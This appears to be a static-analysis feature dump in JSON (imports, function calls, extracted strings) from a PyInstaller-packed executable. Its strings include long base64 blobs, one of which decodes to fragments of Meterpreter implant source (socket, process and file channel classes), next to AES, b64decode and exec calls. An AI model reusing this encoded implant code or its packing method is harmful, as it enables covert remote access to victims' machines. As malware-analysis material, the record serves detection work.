{
    "imports": [
        "*",
        "pyimod01_os_path",
        "listdir",
        "popen_fork",
        "_args_from_interpreter_flags",
        "ArchiveReadError",
        "popen_spawn_win32",
        "sys",
        "re",
        "pyimod03_importers",
        "pyimod00_crypto_key",
        "os",
        "_thread",
        "__doc__",
        "popen_spawn_posix",
        "struct",
        "spawn",
        "_clearcache",
        "zlib",
        "ZlibArchiveReader",
        "marshal",
        "_frozen_importlib",
        "environ",
        "multiprocessing"
    ],
    "function_calls": [
        "NullWriter",
        "read",
        "_args_from_interpreter_flags",
        "__import__",
        "split",
        "exit",
        "ArchiveReadError",
        "install",
        "is_package",
        "hasattr",
        "get_ident",
        "FrozenPackageImporter",
        "os_path_dirname",
        "ModuleSpec",
        "__create_cipher",
        "encode",
        "rfind",
        "load_module",
        "list",
        "os_listdir",
        "FilePos",
        "trace",
        "abspath",
        "loads",
        "reversed",
        "remove",
        "getencoder",
        "extend",
        "replace",
        "putenv",
        "set",
        "getattr",
        "get_filename",
        "join",
        "dict",
        "write",
        "len",
        "append",
        "get_code",
        "local",
        "startswith",
        "keys",
        "os_path_basename",
        "seek",
        "os_path_join",
        "unpack",
        "ImportError",
        "FrozenImporter",
        "AES",
        "type",
        "get",
        "rsplit",
        "range",
        "b64decode",
        "exec",
        "CTR_xcrypt_buffer"
    ],
    "strings": [
        "",
        "No os specific module found",
        "%s is not a valid %s archive file",
        "",
        "\n        Overridable.\n        Check to see if the file object self.lib actually has a file\n        we understand.\n        ",
        "",
        "5lCgogICAgZGVmIHJlYWQoc2VsZiwgbGVuZ3RoKToKICAgICAgICByYWlzZSBOb3RJbXBsZW1lbnRlZEVycm9yKCkKCiAgICBkZWYgd3JpdGUoc2VsZiwgZGF0YSk6CiAgICAgICAgcmFpc2UgTm90SW1wbGVtZW50ZWRFcnJvcigpCgojQGV4cG9ydApjbGFzcyBNZXRlcnByZXRlckZpbGUoTWV0ZXJwcmV0ZXJDaGFubmVsKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCBmaWxlX29iaik6CiAgICAgICAgc2VsZi5maWxlX29iaiA9IGZpbGVfb2JqCiAgICAgICAgc3VwZXIoTWV0ZXJwcmV0ZXJGaWxlLCBzZWxmKS5fX2luaXRfXygpCgogICAgZGVmIGNsb3NlKHNlbGYpOgogICAgICAgIHNlbGYuZmlsZV9vYmouY2xvc2UoKQoKICAgIGRlZiBlb2Yoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuZmlsZV9vYmoudGVsbCgpID49IG9zLmZzdGF0KHNlbGYuZmlsZV9vYmouZmlsZW5vKCkpLnN0X3NpemUKCiAgICBkZWYgcmVhZChzZWxmLCBsZW5ndGgpOgogICAgICAgIHJldHVybiBzZWxmLmZpbGVfb2JqLnJlYWQobGVuZ3RoKQoKICAgIGRlZiB3cml0ZShzZWxmLCBkYXRhKToKICAgICAgICBzZWxmLmZpbGVfb2JqLndyaXRlKGRhdGEpCiAgICAgICAgcmV0dXJuIGxlbihkYXRhKQpleHBvcnQoTWV0ZXJwcmV0ZXJGaWxlKQoKI0BleHBvcnQKY2xhc3MgTWV0ZXJwcmV0ZXJQcm9jZXNzKE1ldGVycHJldGVyQ2hhbm5lbCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgcHJvY19oKToKICAgICAgICBzZWxmLnByb2NfaCA9IHByb2NfaAogICAgICAgIHN1cGVyKE1ldGVycHJldGVyUHJvY2Vzcywgc2VsZikuX19pbml0X18oKQoKICAgIGRlZiBjbG9zZShzZWxmKToKICAgICAgICBzZWxmLnByb2NfaC5raWxsKCkKICAgICAgICBpZiBoYXNhdHRyKHNlbGYucHJvY19oLnN0ZGluLCAnY2xvc2UnKToKICAgICAgICAgICAgc2VsZi5wcm9jX2guc3RkaW4uY2xvc2UoKQogICAgICAgIGlmIGhhc2F0dHIoc2VsZi5wcm9jX2guc3Rkb3V0LCAnY2xvc2UnKToKICAgICAgICAgICAgc2VsZi5wcm9jX2guc3Rkb3V0LmNsb3NlKCkKICAgICAgICBpZiBoYXNhdHRyKHNlbGYucHJvY19oLnN0ZGVyciwgJ2Nsb3NlJyk6CiAgICAgICAgICAgIHNlbGYucHJvY19oLnN0ZGVyci5jbG9zZSgpCgogICAgZGVmIGlzX2FsaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLnByb2NfaC5wb2xsKCkgaXMgTm9uZQoKICAgIGRlZiByZWFkKHNlbGYsIGxlbmd0aCk6CiAgICAgICAgZGF0YSA9ICcnCiAgICAgICAgc3Rkb3V0X3JlYWRlciA9IHNlbGYucHJvY19oLnN0ZG91dF9yZWFkZXIKICAgICAgICBpZiBzdGRvdXRfcmVhZGVyLmlzX3JlYWRfcmVhZHkoKToKICAgICAgICAgICAgZGF0YSA9IHN0ZG91dF9yZWFkZXIucmVhZChsZW5ndGgpCiAgICAgICAgcmV0dXJuIGRhdGEKCiAgICBkZWYgd3JpdGUoc2VsZiwgZGF0YSk6CiAgICAgICAgc2VsZi5wcm9jX2gud3JpdGUoZGF0YSkKICAgICAgICByZXR1cm4gbGVuKGRhdGEpCmV4cG9ydChNZXRlcnByZXRlclByb2Nlc3MpCgojQGV4cG9ydApjbGFzcyBNZXRlcnByZXRlclNvY2tldChNZXRlcnByZXRlckNoYW5uZWwpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHNvY2spOgogICAgICAgIHNlbGYuc29jayA9IHNvY2sKICAgICAgICBzZWxmLl9pc19hbGl2ZSA9IFRydWUKICAgICAgICBzdXBlcihNZXRlcnByZXRlclNvY2tldCwgc2VsZikuX19pbml0X18oKQoKICAgIGRlZiBjb3JlX3dyaXRlKHNlbGYsIHJlcXVlc3QsIHJlc3BvbnNlKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHN0YXR1cywgcmVzcG9uc2UgPSBzdXBlcihNZXRlcnByZXRlclNvY2tldCwgc2VsZikuY29yZV93cml0ZShyZXF1ZXN0LCByZXNwb25zZSkKICAgICAgICBleGNlcHQgc29ja2V0LmVycm9yOgogICAgICAgICAgICBzZWxmLmNsb3NlKCkKICAgICAgICAgICAgc2VsZi5faXNfYWxpdmUgPSBGYWxzZQogICAgICAgICAgICBzdGF0dXMgPSBFUlJPUl9GQUlMVVJFCiAgICAgICAgcmV0dXJuIHN0YXR1cywgcmVzcG9uc2UKCiAgICBkZWYgY2xvc2Uoc2VsZik6CiAgICAgICAgcmV0dXJuIHNlbGYuc29jay5jbG9zZSgpCgogICAgZGVmIGZpbGVubyhzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5zb2NrLmZpbGVubygpCgogICAgZGVmIGlzX2FsaXZlKHNlbGYpOgogICAgICAgIHJldHVybiBzZWxmLl9pc19hbGl2ZQoKICAgIGRlZiByZWFkKHNlbGYsIGxlbmd0aCk6CiAgICAgICAgcmV0dXJuIHNlbGYuc29jay5yZWN2KGxlbmd0aCkKCiAgICBkZWYgd3JpdGUoc2VsZiwgZGF0YSk6CiAgICAgICAgcmV0dXJuIHNlbGYuc29jay5zZW5kKGRhdGEpCmV4cG9ydChNZXRlcnByZXRlclNvY2tldCkKCiNAZXhwb3J0CmNsYXNzIE1ldGVycHJldGVyU29ja2V0VENQQ2xpZW50KE1ldGVycHJldGVyU29ja2V0KToKICAgIHBhc3MKZXhwb3J0KE1ldGVycHJldGVyU29ja2V0VENQQ2xpZW50KQoKI0BleHBvcnQKY2xhc3MgTWV0ZXJwcmV0ZXJTb2NrZXRUQ1BTZXJ2ZXIoTWV0ZXJwcmV0ZXJTb2NrZXQpOgogICAgcGFzcwpleHBvcnQoTWV0ZXJwcmV0ZXJTb2NrZXRUQ1BTZXJ2ZXIpCgojQGV4cG9ydApjbGFzcyBNZXRlcnByZXRlclNvY2tldFVEUENsaWVudChNZXRlcnByZXRlclNvY2tldCk6CiAgICBkZWYgX19pbml0X18oc2VsZiwgc29jaywgcGVlcl9hZGRyZXNzPU5vbmUpOgogICAgICAgIHN1cGVyKE1ldGVycHJldGVyU29ja2V0VURQQ2xpZW50LCBzZWxmKS5fX2luaXRfXyhzb2NrKQogICAgICAgIHNlbGYucGVlcl9hZGRyZXNzID0gcGVlcl9hZGRyZXNzCgogICAgZGVmIGNvcmVfd3JpdGUoc2VsZiwgcmVxdWVzdCwgcmVzcG9uc2UpOgogICAgICAgIHBlZXJfaG9zdCA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX1BFRVJfSE9TVCkuZ2V0KCd2YWx1ZScpCiAgICAgICAgcGVlcl9wb3J0ID0gcGFja2V0X2dldF90bHYocmVxdWVzdCwgVExWX1RZUEVfUEVFUl9QT1JUKS5nZXQoJ3ZhbHVlJykKICAgICAgICBpZiBwZWVyX2hvc3QgYW5kIHBlZXJfcG9ydDoKICAgICAgICAgICAgcGVlcl9hZGRyZXNzID0gKHBlZXJfaG9zdCwgcGVlcl9wb3J0KQogICAgICAgIGVsaWYgc2VsZi5wZWVyX2FkZHJlc3M6CiAgICAgICAgICAgIHBlZXJfYWRkcmVzcyA9IHNlbGYucGVlcl9hZGRyZXNzCiAgICAgICAgZWxzZToKICAgICAgICAgICAgcmFpc2UgUnVudGltZUVycm9yKCdwZWVyX2hvc3QgYW5kIHBlZXJfcG9ydCBtdXN0IGJlIHNwZWNpZmllZCB3aXRoIGFuIHVuYm91bmQvdW5jb25uZWN0ZWQgVURQIGNoYW5uZWwnKQogICAgICAgIGNoYW5uZWxfZGF0YSA9IHBhY2tldF9nZXRfdGx2KHJlcXVlc3QsIFRMVl9UWVBFX0NIQU5ORUxfREFUQSlbJ3ZhbHVlJ10KICAgICAgICB0cnk6CiAgICAgICAgICAgIGxlbmd0aCA9IHNlbGYuc29jay5zZW5kdG8oY2hhbm5lbF9kYXRhLCBwZWVyX2FkZHJlc3MpCiAgICAgICAgZXhjZXB0IHNvY2tldC5lcnJvcjoKICAgICAgICAgICAgc2VsZi5jbG9zZSgpCiAgICAgICAgICAgIHNlbGYuX2lzX2FsaXZlID0gRmFsc2UKICAgICAgICAgICAgc3RhdHVzID0gRVJST1JfRkFJTFVSRQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIHJlc3BvbnNlICs9IHRsdl9wYWNrKFRMVl9UWVBFX0xFTkdUSCwgbGVuZ3RoKQogICAgICAgICAgICBzdGF0dXMgPSBFUlJPUl9TVUNDRVNTCiAgICAgICAgcmV0dXJuIHN0YXR1cywgcmVzcG9uc2UKCiAgICBkZWYgcmVhZChzZWxmLCBsZW5ndGgpOgogICAgICAgIHJldHVybiBzZWxmLnNvY2sucmVjdmZyb20obGVuZ3RoKVswXQoKICAgIGRlZiB3cml0ZShzZWxmLCBkYXRhKToKICAgICAgICBzZWxmLnNvY2suc2VuZHRvKGRhdGEsIHNlbGYucGVlcl9hZGRyZXNzKQpleHBvcnQoTWV0ZXJwcmV0ZXJTb2NrZXRVRFBDbGllbnQpCgpjbGFzcyBTVERQcm9jZXNzQnVmZmVyKHRocmVhZGluZy5UaHJlYWQpOgogICAgZGVmIF9faW5pdF9fKHNlbGYsIHN0ZCwgaXNfYWxpdmUpOgogICAgICAgIHRocmVhZGluZy5UaHJlYWQuX19pbml0X18oc2VsZikKICAgICAgICBzZWxmLnN0ZCA9IHN0ZAogICAgICAgIHNlbGYuaXNfYWxpdmUgPSBpc19hbGl2ZQogICAgICAgIHNlbGYuZGF0YSA9IGJ5dGVzKCkKICAgICAgICBzZWxmLmRhdGFfbG9jayA9IHRocmVhZGluZy5STG9jaygpCgogICAgZGVmIHJ1bihzZWxmKToKICAgICAgICBmb3IgYnl0ZSBpbiBpdGVyKGxhbWJkYTogc2VsZi5zdGQucmVhZCgxKSwgYnl0ZXMoKSk6CiAgICAgICAgICAgIHNlbGYuZGF0YV9sb2NrLmFjcXVpcmUoKQogICAgICAgICAgICBzZWxmLmRhdGEgKz0gYnl0ZQogICAgICAgICAgICBzZWxmLmRhdGFfbG9jay5yZWxlYXNlKCkKCiAgICBkZWYgaXNfcmVhZF9yZWFkeShzZWxmKToKICAgICAgICByZXR1cm4gbGVuKHNlbGYuZGF0YSkgIT0gMAoKICAgIGRlZiBwZWVrKHNlbGYsIGwgPSBOb25lKToKICAgICAgICBkYXRhID0gYnl0ZXMoKQogICAgICAgIHNlbGYuZGF0YV9sb2NrLmFjcXVpcmUoKQogICAgICAgIGlmIGwgPT0gTm9uZToKICAgICAgICAgICAgZGF0YSA9IHNlbGYuZGF0YQogICAgICAgIGVsc2U6CiAgICAgICAgICAgIGRhdGEgPSBzZWxmLmRhdGFbMDpsXQogICAgICAgIHNlbGYuZGF0YV9sb2NrLnJlbGVhc2UoKQogICAgICAgIHJldHVybiBkYXRhCgogICAgZGVmIHJlYWQoc2VsZiwgbCA9IE5vbmUpOgogICAgICAgIHNlbGYuZGF0YV9sb2NrLmFjcXVpcmUoKQogICAgICAgIGRhdGEgPSBzZWxmLnBlZWsobCkKICAgICAgICBzZWxmLmRhdGEgPSBzZWxmLmRhdGFbbGVuKGRhdGEpOl0KICAgICAgICBzZWxmLmRhdGFfbG9jay5yZWxlYXNlKCkKICAgICAgICByZXR1cm4gZGF0YQoKI0BleHBvcnQKY2xhc3MgU1REUHJvY2VzcyhzdWJwcm9jZXNzLlBvcGVuKToKICAgIGRlZiBfX2luaXRfXyhzZWxmLCAqYXJncywgKiprd2FyZ3MpOgogICAgICAgIGRlYnVnX3ByaW50KCdbKl0gc3RhcnRpbmcgcHJvY2VzczogJyArIHJlcHIoYXJnc1swXSkpCiAgICAgICAgc3VicHJvY2Vzcy5Qb3Blbi5fX2luaXRfXyhzZWxmLCAqYXJncywgKiprd2FyZ3MpCiAgICAgICAgc2VsZi5lY2hvX3Byb3RlY3Rpb24gPSBGYWxzZQoKICAgIGRlZiBpc19hbGl2ZShzZWxmKToKICAgICAgICByZXR1cm4gc2VsZi5wb2xsKCkgaXMgTm9uZQoKICAgIGRlZiBzdGFydChzZWxmKToKICAgICAgICBzZWxmLnN0ZG91dF9yZWFkZXIgPSBTVERQcm9jZXNzQnVmZmVyKHNlbGYuc3Rkb3V0LCBzZWxmLmlzX2FsaXZlKQogICAgICAgIHNlbGYuc3Rkb3V0X3JlYWRlci5zdGFydCgpCiAgICAgICAgc2VsZi5zdGRlcnJfcmVhZGVyID0gU1REUHJvY2Vzc0J1ZmZlcihzZWxmLnN0ZGVyciwgc2VsZi5pc19hbGl2ZSkKICAgICAgICBzZWxmLnN0ZGVycl9yZWFkZXIuc3RhcnQoKQoKICAgIGRlZiB3cml0ZShzZWxmLCBjaGFubmVsX2RhdGEpOgogICAgICAgIGxlbmd0aCA9IHNlbGYuc3RkaW4ud3JpdGUoY2hhbm5lbF9kYXRhKQogICAgICAgIHNlbGYuc3RkaW4uZmx1c2goKQogICAgICAgIGlmIHNlbGYuZWNob19wcm90ZWN0aW9uOgogICAgICAgICAgICBlbmRfdGltZSA9IHRpbWUudGltZSgpICsgMC41CiAgICAgICAgICAgIG91dF9kYXRhID0gYnl0ZXMoKQogICAgICAgICAgICB3aGlsZSAodGltZS50aW1lKCkgPCBlbmRfdGltZSkgYW5kIChvdXRfZGF0YSAhPSBjaGFubmVsX2RhdGEpOgogICAgICAgICAgICA",
        "\nPEP-302 and PEP-451 importers for frozen applications.\n",
        "-c",
        "VIRTUAL_ENV",
        "\n        PEP-451 loader.create_module() method for the ``sys.meta_path`` hook.\n\n        Loaders may also implement create_module() that will return a new\n        module to exec. It may return None to indicate that the default module\n        creation code should be used. One use case, though atypical, for\n        create_module() is to provide a module that is a subclass of the\n        builtin module type. Most loaders will not need to implement\n        create_module(),\n\n        create_module() should properly handle the case where it is called\n        more than once for the same spec/module. This may include returning\n        None or raising ImportError.\n        ",
        "\n        PEP-451 finder.find_spec() method for the ``sys.meta_path`` hook.\n\n        fullname     fully qualified name of the module\n        path         None for a top-level module, or package.__path__ for\n                     submodules or subpackages.\n        target       unused by this Finder\n\n        Finders are still responsible for identifying, and typically creating,\n        the loader that should be used to load a module. That loader will now\n        be stored in the module spec returned by find_spec() rather than\n        returned directly. As is currently the case without the PEP-452, if a\n        loader would be costly to create, that loader can be designed to defer\n        the cost until later.\n\n        Finders must return ModuleSpec objects when find_spec() is called.\n        This new method replaces find_module() and find_loader() (in the\n        PathEntryFinder case). If a loader does not have find_spec(),\n        find_module() and find_loader() are used instead, for\n        backward-compatibility.\n        ",
        "PathFinder",
        "\n        Method should return the source code for the module as a string.\n        But frozen modules does not contain source code.\n\n        Return None.\n        ",
        "\n        Overridable.\n        Default: After magic comes an int (4 byte native) giving the\n        position of the TOC within self.lib.\n        Default: The TOC is a marshal-able string.\n        ",
        "\n        This method should return the value that __file__ would be set to\n        if the named module was loaded. If the module is not found, then\n        ImportError should be raised.\n        ",
        ".pyc",
        "pack_into",
        "PYTHONCASEOK",
        "WindowsRegistryFinder",
        "",
        "pack",
        "UTF-8",
        "%s has version mismatch to dll",
        "_MEIPASS2",
        "\n    ZlibArchive - an archive with compressed entries. Archive is read\n    from the executable created by PyInstaller.\n\n    This archive is used for bundling python modules inside the executable.\n\n    NOTE: The whole ZlibArchive (PYZ) is compressed so it is not necessary\n          to compress single modules with zlib.\n    ",
        "\n    A base class for a repository of python code objects.\n    The extract method is used by imputil.ArchiveImporter\n    to get code objects by name (fully qualified name), so\n    an enduser \"import a.b\" would become\n      extract('a.__init__')\n      extract('a.b')\n    ",
        "from multiprocessing.forkserver import main",
        "\n        Return a list of the contents\n        Default implementation assumes self.toc is a dict like object.\n        Not required by ArchiveImporter.\n        ",
        "is_package",
        "codecs",
        "frozen",
        "import %s as %s # PyInstaller PYZ (__path__ override: %s)",
        "\n        PEP-302 loader.load_module() method for the ``sys.meta_path`` hook.\n\n        Return the loaded module (instance of imp_new_module()) or raises\n        an exception, preferably ImportError if an existing exception\n        is not being propagated.\n\n        When called from FrozenPackageImporter, `entry_name` is the name of the\n        module as it is stored in the archive. This module will be loaded and installed\n        into sys.modules using `fullname` as its name\n        ",
        "\n        Load, unzip and initialize the Zip archive bundled with the executable.\n        ",
        "\\",
        "\n        This returns the data as a string, or raise IOError if the \"file\"\n        wasn't found. The data is always returned as if \"binary\" mode was used.\n\n        This method is useful getting resources with 'pkg_resources' that are\n        bundled with Python modules in the PYZ archive.\n\n        The 'path' argument is a path that can be constructed by munging\n        module.__file__ (or pkg.__path__ items)\n        ",
        "wM0tVeGh3M3RtTzgyUkx0R2w4MFQyc2JvbjJOWkhHZWNYVFlHZ240ZnJCZmx6L3ZvOWZYUzVBdkVUUnhQbXptYWVScW1ZYU5QaHhQYWNzOHYyM1dxcDNyZmpvNWMwQ0gyK0p2UHF2ZTRWdFdValJkRC96cXVjN1o1WDBUWGlZdVVoMURHN2RZV0RHQjF0T2l5MHZ4OWpIWGR3b0h0TVV4RUQ4eERpUG1oU3JlOEcrRzRhbTJNa251Wjd4YTNlOXpGUlI3TnZLL1ZXbldNVmVXeVJ1dm5HOGYwR0FORnlhbDFjVE5HazJXYjE5dXlMVlcrOFJ5djFzYlFtSWZlanYzWVR3d0RReE4vbG55RmFvczd1Ni96WW8vUlNFdlRNbXkxVXovMWV6NTJYL3F0MzRiOHNwL3FOWWEyZk1BU2w2MXJKa2E3cVYzYmRjdnYxdEVtTVJ2bWRZOXh1bzZYNVhDaU4zWnhaK1R4am5IRDV6UWE3N1kxZXhPaldUWkpIZWV6OUhtOFRiUkp6T1I1TWRzbVJzNnA1OWFiNHk0dHBuemRlY2cvMldUREVrZlFMZGxPY1lqeHA4cVRpQ2xsaUxtR05oMUNPZEcxOGgzNnVEMjJuZ2tpZW1RYkQ4Nmo2WXE1bU10czAybGQ1M1h1ODMzWGVTdTJvczQzaTY0WjQxYkxiZHhFdjVpYVBKb1FVdHpvSlhkQ2lLT0pUbkNjWlo3REVJcUpJK05vWXpaYnRydys0eDVqU3RVeURxelJqSFhINEYzSFpMUnNlZXB4T2pHUVQvbG05UmpOV0U0TWpHSEtzWjBZbSt1dDJabzZHM3F2NGxLT0EyTkdHNWVucjdtczh6TEU3TXZZdkVYcnh5Q1hENWhpMElsem83dms0TTJCbFhITjJvNERXK0pWWS9ESW84bnhkdHp5U3ExRHQzUXhJR1RiTEczWGRqc2RNcWFVdlNub0FUR1ZiWEhuNUpjeExNV3NreWV4TjlGdjRyYktGK3ZqNTl1V2h4Q1lqWkc2elBPSmVUNW01UlV0RlAzUXg4WE14OFlMUlRzeklTNHhrRzk5SGs0ZFBiMWNxanlHdG8rQnF0c1pPbU0wblpzbGoySHM0eGk3TnIrN3pGc01ReFczYzduR256NVBjeHRpcG01R1pzeVlQY3U5QWhsZHZFQmNoRHljTWk3N3VpNmNjZlljaHBFaGh3YWJkaGhGNHE2S0M4QjlVTVlBMmk1NVhFdm9KK2JlYkp1eGlGRTZtdmVnUzc1VUg3THBDb2J4SmJyVlZ1WUx4SXdkNWNIRWhacGlRRy9iUFBNWUdtTmkydW5GNHh4L1YyNlpmdWlHYnVTNHgyaU9ySEhpYk9Ja3k3WEtSb2l1c0FWTXVOVGpWbTVKN1RqeU9ZZXNrdnRnSG9mb0szd1pxaTlUeS9IWUtpYmNjV2EyeW9GczdEVldaalBtYTlVeDdvL054RHVzZVRnelBUTm1tbktydUh2YXVIcjl5UG5rRVl4VnZrQUlNQWFmSmw5aG10cjRzM05SaTRCV1BEeS8yNFpoOXA3QmRNait5cy9IbUdXRFkwd3UrWmN6bjJJU1dVdW1nemFtaXhnNDg3ajdtSHE3T3RzalJyRzQweFp1MmlJYUtTNWZmamVFMEpRTHB6dm1uNWtoZklyaGMrMjVDN2FZRi9hU3ZqVEhBRkFzTk1JUVUwdXpaMCtJdXlYK3JQbTYxUklYS25TYjJxMVN1MU1yNy9MMjhpNVhSdDVsSXBWM1FRbmMxUjBQZDNYbndWMUdPSEdYQmxLZlFVVk1CbHdYY1JjdmlMdU1vZUl1QWhOM0dXL0ZYYVpSY1JkemlydTRTOXhsd2hSM3VWemlMdGRUM0tYemlMdGNXbkdYS1FqdHdtbHBWMWhBdTh4VzBpN0Vrblo1bHJUTHpTRHRjZ3RLdTdCSjJ1VytrSGE1VzZSZDdndHBsN3RGMnVXQ1NydlFXOXFGakdBWGJRaTdEQ25DTHVPVHNBdnRoRjFxQXF6TEhDanJNczdJdWlCZDFnVUFzaTRqUGtTQWNMSXVQVlhXaFhDeUxsT1JyTXZvSk9zeUFLSVVxaFpabDJHRVFRZHd5cnJVQTdJdThwZDFtZkpsWFFZTVdSZi95cnJNT2JJdVZwWjFtWGxsWFdZMVdSY0l5THJjNzdJdVpZK3NTMFVuNjFMMnlMb1VkN0l1OVphc3EyRVY2MUt4eWJyY2JiSXVvN0dzeTJncTZ6S2V5N29VTGJJdWxZcXNpM1NyUmRabGxKWDhxT1JrWFdRaTY2Sk1XUmNIeWJyVUlySXU0NldzQ3dkbFhjcFJXUmNneTdwTUpiSXVzNVdzSzI1Z1hXb2dXUmZDeWJvWVE5YUZ3ckl1ZzVpc0M3VmtYWWd0NnpLN3lycE1uckx1Y2NZWVVOWTllaEVTYm1SZFZDYnJVZ2JJdXN6ZnNpNVdsbldQanN6d0hhK1YySVZFd2k1bUVuYkJqYkRMSFlaMUdlaGtYU29SV1pmS1ZkYUZ3ckx1TWJ4cGdKZDFxYlNocmdaZnFFdGxLK3BpTGxFWHg0cTYzTzJpTHJXeHFBdm5SVjJtWjFFWFU0bTZZRUxVQlZLaUx2T0dxQXRkUkYzd0krcXl5aURxTXFXS3VsUzVvaTQxaHhESUxDYnFVbEtMdWhTaG9pNEZqcWhMcVM3cVVsMkx1cFRxQmRiRlY3SXVNNXFzQ3dkbFhXWmxXWmRDVDlhbGFwZDFLVzVsWGVwUldSZFd5N29zcHNpNkZNMnlMak9sckl1S1pkM2pORmx2a0hWWnZKQjFxYUZrWFJncTYzS0ZaVjJxV0ZtWFdWZldwV2FXZFZrTmtIVXhyYXhMZFNIcndtWlpGenJJdXFxdnNTN0ZRUUYyUWJ5d2kzbUVYV1FuN0ZMQ0M3dXMvUWk3WEN1c1M5RW82MUs4eWJxc0FzbTYxS0t5THNLV2RZRzVyRXU5SmV2aVgxbVg0bHJXWlZGRDFxV0FsSFVwYTJSZGxtaGtYUmFQWkYxTUt1dWllRm1Yd2xUV1pVRkIxdFdhQmRhbDVDN0FMa1Y3Z1hhUGlZZHhwSkoycVVxa1hUd243V0psYWZlUUM0TXcyR1ZaUmRpbHRoTjJXUXNUZGxsYkVuWWxON0RMNHArd1M4VXQ3T0piWVpjMUQyRVhPd3E3ckk4SXU2eThDYnY0VmRqVmNnVFlwVklYZGxueUs5QXU1YUcweStxSXRBdVdwVjNxUEdtWFNsM2FwVnlTZGxuWWxIWWh0TFJMd1N6dFFvd0M3bEplaUx1c01SUjRGK2ZMdTZyWThDN2xuN3liVjZLVGR5a3I1VjFxZlhtWHRSaDVsL1VHZVpmbEUzbVhHa25lcGFxWGQ3VVFpM2VwS3VUZDFHNmQyczExM2ZRdWZVM2U1ZFhsWGFaMGVaZWh0QUM4bWhVQnIrbzl3TXY4Si9BeUNhamJNTDB4STBCSmdaZnhWZUJsbmhKNG1UVUZYZ1pLZ1pjQlRlQmxvQlI0R2MwRlhnZ3I4TUpvZ1pkYlhlQmxDQkY0R2ZrRlh1YlZBdkV5RlVxOFdqSkR2TXd6RWkvamdzVExqU2p4TXFKSnZOenJFaSt6cmNUTGdDWHhnbWVKRjROS3ZBaFA0a1dERWk4R2xYZ2hkUUY1bWV0RVhtZ3I4bEp1aWJ5b1JPUmxrQ2t3TC95U2VibXJaVjc2bmN4TFhTRHpVamhBQllZbW1aZnhTT2FsTThxOERJUXlMOWFYZVJrczBBcEZpc3pMUGNuUXc3Z2g4M0pueUx6TVl6SXZoWW5NeTdBZzg0SlVtUmR6eUx5TUpwQ1hxVlRraFk4aUwvb1FlY0d4eUtzWkMvSlNZWWk4VEhraUw5WVhlWmsvUlY3ZFJKQ1hNVWprWmJZV2VVR1l5SXRhUkY1S1NKR1hHa1BrUlF3aUwrRE5aZDBrTDBPUEFNajlLL0pTVUlxOGxGSWlMNVdTeU10dEwvS0t3WkFYRDRtOGVGYmtoVndpTDBPd3lJdEdSVjROMTVDWEdWM2taV29RZWFrTlJGNW1hWkdYMmtEa1pXQVdlWmw5UkY0cVZaR1h5VUhrUGM2WTZWamtQVG9SeGRBaThsTHJpTHlnUXVSbDNoUjVtWWxFM3FNZnc2eGQ1R1dRRjNrcGxrVmVKaHFSbDVxa3dMeUlXT1pseHBCNUdiaGxYaVpobWZjWTRiaHN1OHdMeFF2UXE2VVkwRXZ4SnZRaWFjekxCQ2Z6VW5uTHZFeW5NaTkxazh4TENTRHpNcVBJdk16aU1pOXpuY3dMUEdWZXFrcVpGeS9KdkVoTzVtWFZRZWFsTUpaNUtVaUVRU29TbVpmQ1FPWkZIVEl2MDZuTVM2a2s4NklPbVJjbHlielVhREl2WmFmTXEya1A4MUlQeUx5VWF6SXZGYmZNcTJXV0pDOXlGWGxCbjhnTEprVmVaajJSbCtJYzhUSzNTN3pIU2NJMGlaYzFCWW1YVlF1SlZ5Wkh2QlFPRWkvTE5CSXZnNUxFUytFZzhZSm5pUmUvUzd6VUd4SXZSYTNFaTQwbFhwVktpSmRWSjRsWDdrUzhVRjdpWlMxSjRrWHRFaS9zbDNoWkdTa2dMNnMzSWkvTEdTSXZtQkY1V1pFUmVibnNpSmVLVStLRlFCSXZlSlo0V1dHUWVGbmRrWGdwQmlSZUlDN3hnaDJKbDhKYjRvV3pFaThyRnhJdjdwUjRxZUlsWGkyNUlWNXFDSW1YK2xiaVBhWWRPc01tOGJJU0kvRlNva204VkwwUzcwRVhsajRLeUV2MWlYaForWkI0S1ZRbFhpcE9pVmVmMnlGZUhDN3hjck5Mdk5ScUVpOHJOUkl2N3lEeDRrZUpsekpUNHNWNUVxOVdqeEV2S3h3U0x3V0x4TXRDZzhUTHlwTEVTN1VuOGJJc0tQRlMzRWk4TE9WSXZLeGFTTHlzYlVtOHJBTkl2QlJnRWk4M2xjU0x1U1ZlSmpuQXE0KzJBQytybUFJdk5ZakFxd1Vnd010U244RExtcXZBeTRLVndJdHM4QzRjbG5kWmFKVjNWUXZnWFpabTVOM1ViaVB0eXJ0b1Y5NUZ1L0l1MnBWMzBhNjhpM2JsWGJRcjc2SmRlWmN1bzA3RFhNQnNnSGJsWGJRcjc2SmRlUmZ0eXJ0b1Y5NUZ1L0l1MnBWMzBhNjhpM2JsWGJRcjc2SmRlUmZ0eXJ0b1Y5NUZ1L0l1MnBWMzBhNjhpM2JsWGJRcjc2SmRlUmZ0eXJ0b1Y5NUZ1L0l1MnBWMzljRW0za1c3OGk3YWxYZlJycnlMZHVWZGZacUNkOUd1dkl0MjVWMjBLKytpWFhsWG44bmlYYlFyNzZKZGVSZnR5cnRvVjk1RkNUZ0I3Y3E3YUZmZVJidnlyc3Ardkl0MjVWMmdBbFhRcnJ6THNNUEFveW9aNzZKZGVSZnR5cnRvVjk1RnUvSXUycFYzMGE2OHl6eUtkOUd1dkl0MjVWMjBLKzlxS1Jqdm9sMTVGKzNLdTJoWDNrVzc4aTdhbFhmUnJyeUxkdVZkdEN2dm9sMTVGKzNLdTJoWDNrVzc4aTREZ2J6N3BGMTVGL3RKZjJoWDNtVmVsM2ZScnJ5TGR1VmR0Q3Z2b2wxNUYrM0t1MmhYM2tXNzhpN2FsWGZScnJ5TGR1VmR0Q3Z2b2wxNVZ3RWd2SXQyNVYyMEsrK2lYWGtYN2NxN2FGZmVWY3dHN3g1bmpIYmwzYU1UU2J2eUx0cVZkOUd1dkl0MjVWMjBLKzhlL2ZoSnUzZ1g3Y3E3YUZmZVJidnlybUpEZUJmdHlydG9WOTVGdS9JdTJwVjNqeEZPMnBWMzljRXgza1c3OGk3YWxYYzFUcV